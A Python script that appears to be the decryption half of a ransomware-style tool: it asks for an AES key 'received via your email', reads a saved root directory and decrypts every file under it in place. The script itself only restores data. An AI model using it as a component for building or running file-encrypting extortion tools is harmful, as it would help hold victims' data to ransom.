from os import walk, path
from cryptography.hazmat.primitives.ciphers import Cipher
from cryptography.hazmat.primitives.ciphers.algorithms import AES
from cryptography.hazmat.primitives.ciphers.modes import CBC
from cryptography.hazmat.primitives.padding import PKCS7
from cryptography.hazmat.backends import default_backend
from colorama import Fore, init
from json import load
from  time import sleep 


def RecoverData(filename):
    
    try :
        # Open the input and output files
        with open(filename, 'rb') as encrypted_file:
            # Read the IV from the file
            initial_vect = encrypted_file.read(16)

            # Create a Cipher object using AES in CBC mode with a random IV
            cipher = Cipher(AES(bytes.fromhex(key)), CBC(
                initial_vect), backend=default_backend())

            # Decrypt the file
            decryptor = cipher.decryptor()
            cipher_text = encrypted_file.read()

            # Remove padding from the plaintext
            unpadder = PKCS7(128).unpadder()
            plaintext = decryptor.update(cipher_text) + decryptor.finalize()
            unpadded_plaintext = unpadder.update(plaintext) + unpadder.finalize()

        # Write the decrypted data to a new file
        with open(filename, 'wb') as decrypted_file:
            decrypted_file.write(unpadded_plaintext)
            
    except Exception:pass


if __name__ == '__main__':


    init(autoreset=True)
    print(Fore.GREEN + "    ______      _                       ____            _")
    print(Fore.GREEN + "   / ____/___  (_)___ _____ ___  ____ _/ __ \___ _   __(_)   _____  _____")
    print(Fore.YELLOW + "  / __/ / __ \/ / __ `/ __ `__ \/ __ `/ /_/ / _ \ | / / / | / / _ \/ ___/")
    print(Fore.BLUE + " / /___/ / / / / /_/ / / / / / / /_/ / _, _/  __/ |/ / /| |/ /  __/ /")
    print(Fore.MAGENTA +"/_____/_/ /_/_/\__, /_/ /_/ /_/\__,_/_/ |_|\___/|___/_/ |___/\___/_/\n\n\n")
    
    


    i = 0

    while i < 4:

        key = input('\n\n\nPlease insert the key you received via your email address :  ')

        try:
            # Check if the key is valid by creating an AES object using the key
            AES(bytes.fromhex(key))
            break
        except Exception:

            print('\nThe inserted key is unvalid !!')
            i += 1
            continue
        
        
    # Extract the root directory provided by the user at the initialization phase
    with open(path.abspath('.User__Data.json')   ,'r') as UserDataFile:
        RootDir = load(UserDataFile)['root_dir']
        

    for path, _, files in walk(RootDir):
        for file_name in files:

            RecoverData('/'.join([path, file_name]))

    print(Fore.GREEN+'\n\n>> Your data is been recovered successfuly\n\n')
    sleep(60)
